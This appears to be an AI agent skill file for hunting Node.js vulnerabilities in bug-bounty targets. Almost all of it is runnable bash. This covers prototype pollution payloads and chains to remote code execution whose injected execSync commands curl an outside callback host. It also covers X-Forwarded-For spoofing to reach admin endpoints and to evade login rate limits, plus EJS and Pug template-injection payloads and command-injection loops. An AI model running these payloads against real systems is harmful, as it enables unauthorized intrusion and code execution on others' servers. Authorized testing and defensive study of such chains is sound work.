---
name: k1nzr3c0n-hunt-nodejs
description: "Hunt Node.js specific vulnerabilities. Prototype Pollution → RCE (lodash/merge, Object.assign → child_process sink), Express trust proxy bypass (X-Forwarded-For spoofing), EJS/Pug/Handlebars SSTI → RCE, child_process injection, require() path traversal. Fingerprint: X-Powered-By: Express, package.json exposed, /proc/self/environ."
tags: [nodejs, prototype-pollution, ssti, rce, express, hunt, web-security, bug-bounty]
---

# K1NZR3C0N Hunt — Node.js Specific

> **Crown jewel**: Prototype Pollution reaching child_process sink = Critical RCE.
> **Detect**: X-Powered-By: Express, package.json exposed, Node stack traces.

---

## Phase 0 — Fingerprint Node.js

```bash
TARGET="${TARGET:-}"
HUNT="/tmp/hunt_nodejs_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"

echo "=== Node.js Fingerprinting ==="
curl -sI "https://${TARGET}/" | grep -iE 'x-powered-by|nodejs|express|koa|fastify' | sed 's/^/  /'

# Check for exposed package files
for FILE in /package.json /package-lock.json /.npmrc /node_modules/.package-lock.json; do
  CODE=$(curl -sk -o /tmp/pkg_check -w "%{http_code}" "https://${TARGET}${FILE}")
  if [ "$CODE" = "200" ]; then
    echo "  [EXPOSED] ${FILE}"
    grep -i '"name"\|"version"\|"dependencies"' /tmp/pkg_check | head -5 | sed 's/^/    /'
  fi
done

# Error-based confirmation
curl -s "https://${TARGET}/nonexistent-xyz" | grep -i "cannot GET\|node\|express\|at Object\.<" | head -3 | sed 's/^/  /'
```

## Phase 1 — Prototype Pollution Detection

```bash
echo "=== Prototype Pollution ==="
BASE="https://${TARGET}"

# JSON body injection
echo "Test 1: __proto__ in JSON body"
curl -sk -X POST "${BASE}/api/merge" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"polluted": "rune3f7m"}}' | grep -i 'polluted\|rune3f7m' | sed 's/^/  [PP-JSON] /'

echo "Test 2: constructor.prototype"
curl -sk -X POST "${BASE}/api/settings" \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"isAdmin": true}}}' | grep -i 'isAdmin\|true' | sed 's/^/  [PP-CONSTRUCTOR] /'

echo "Test 3: URL query param (qs library)"
curl -sk "${BASE}/api/search?__proto__[polluted]=yes&query=test" | grep -i 'polluted' | sed 's/^/  [PP-QS] /'
curl -sk "${BASE}/api/data?constructor[prototype][admin]=1" | grep -i 'admin.*1\|isAdmin' | sed 's/^/  [PP-QS2] /'

echo ""
echo "Confirm pollution: does subsequent request reflect polluted key?"
curl -sk "${BASE}/api/me" | grep -i 'polluted\|isAdmin' | sed 's/^/  [CONFIRMED] /'
```

## Phase 2 — Prototype Pollution → RCE

```bash
echo "=== PP → RCE Chains ==="
OOB="${OOB:-$(openssl rand -hex 4).oastify.com}"
BASE="https://${TARGET}"

echo "Chain 1: lodash template pollution (CVE-2021-23337)"
curl -sk -X POST "${BASE}/api/render" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"sourceURL": "\nreturn process.mainModule.require(\"child_process\").execSync(\"curl http://'"${OOB}"'/pp-rce\").toString()//"}}'
echo "  Check OOB: ${OOB}"

echo ""
echo "Chain 2: EJS template outputFunctionName pollution"
curl -sk -X POST "${BASE}/api/template" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"curl http://'"${OOB}"'/ejs-rce\");x"}}'

echo ""
echo "Chain 3: shell + NODE_OPTIONS pollution"
curl -sk -X POST "${BASE}/api/update" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"shell": "node", "NODE_OPTIONS": "--inspect='"${OOB}"'"}}'
```

## Phase 3 — Express Trust Proxy Bypass

```bash
echo "=== Express Trust Proxy Abuse ==="
BASE="https://${TARGET}"

echo "Test: does spoofed X-Forwarded-For bypass IP-based rate limiting or allowlist?"
echo ""

# Spoof localhost
STATUS=$(curl -sk -X POST "${BASE}/api/admin/action" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "Content-Type: application/json" \
  -d '{"action":"test"}' -o /dev/null -w "%{http_code}")
echo "  X-FF: 127.0.0.1 → $STATUS"

# Spoof internal IP
STATUS=$(curl -sk -X POST "${BASE}/api/internal" \
  -H "X-Forwarded-For: 10.0.0.1" \
  -H "X-Real-IP: 10.0.0.1" -o /dev/null -w "%{http_code}")
echo "  X-FF: 10.0.0.1 → $STATUS"

echo ""
echo "Rate limit bypass via rotating fake IPs:"
for I in $(seq 1 20); do
  curl -sk "${BASE}/api/login" \
    -H "X-Forwarded-For: 192.168.1.${I}" \
    -d '{"email":"admin@test.com","password":"wrong"}' \
    -o /dev/null -w "${I}: %{http_code}\n"
done | grep -v "429" | wc -l | xargs -I{} echo "  {} of 20 bypassed rate limit"
```

## Phase 4 — Template Engine SSTI

```bash
echo "=== Node.js SSTI (EJS / Pug / Handlebars) ==="
BASE="https://${TARGET}"

echo "EJS test:"
RESP=$(curl -sk -X POST "${BASE}/api/render" \
  -H "Content-Type: application/json" \
  -d '{"template": "<%= 7*7 %>"}')
echo "$RESP" | grep -o '49' | head -1 | sed 's/^/  [EJS-MATH] 7*7=/'

echo ""
echo "EJS RCE:"
OOB="${OOB:-$(openssl rand -hex 4).oastify.com}"
curl -sk -X POST "${BASE}/api/render" \
  -H "Content-Type: application/json" \
  -d '{"template": "<%= process.mainModule.require(\"child_process\").execSync(\"curl http://'"${OOB}"'/ejs-rce\").toString() %>"}'
echo "  Check OOB: ${OOB}"

echo ""
echo "Pug SSTI:"
curl -sk -X POST "${BASE}/api/render" \
  -H "Content-Type: application/json" \
  -d '{"template": "- var x = root.process\n= x.mainModule.require(\"child_process\").execSync(\"id\")"}'
```

## Phase 5 — child_process Injection

```bash
echo "=== child_process Injection ==="
BASE="https://${TARGET}"

echo "Test common injection points (filename, command, path parameters):"
for PARAM in "filename" "cmd" "command" "path" "file" "name" "query"; do
  # OS command metacharacter injection
  for PAYLOAD in '; id' '| id' '\`id\`' '$(id)' '& id &'; do
    RESP=$(curl -sk -X POST "${BASE}/api/exec" \
      -H "Content-Type: application/json" \
      -d "{\"${PARAM}\": \"test${PAYLOAD}\"}" 2>/dev/null)
    echo "$RESP" | grep -oP 'uid=[0-9]+[^$]+' | head -1 | \
      sed "s/^/  [RCE via ${PARAM}] /"
  done
done
```

## Gate 0

```bash
echo "=== Node.js Gate 0 ==="
echo "  □ PP: polluted key reflected in subsequent response"
echo "  □ PP→RCE: OOB HTTP callback received from lodash/EJS/shell chain"
echo "  □ Trust proxy: request with spoofed IP bypasses restriction/rate-limit"
echo "  □ SSTI: 7*7=49 reflected OR OOB from template execution"
echo "  □ child_process: 'id' output in response"
echo ""
echo "  SEVERITY: PP→RCE=Critical | Trust proxy bypass=Medium-High | SSTI=Critical"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
Prototype Pollution → RCE on [/api/merge]: __proto__.outputFunctionName injection in EJS template engine executes OS commands — confirmed via OOB callback uid=1000(app) at rce.oastify.com
Express trust proxy misconfiguration: X-Forwarded-For: 127.0.0.1 bypasses admin endpoint restriction on [/api/admin/reset] returning 200 vs 403 from real external IP
EJS SSTI on [/api/render]: template parameter reflects 49 for <%= 7*7 %>; confirmed RCE via child_process.execSync OOB callback
```
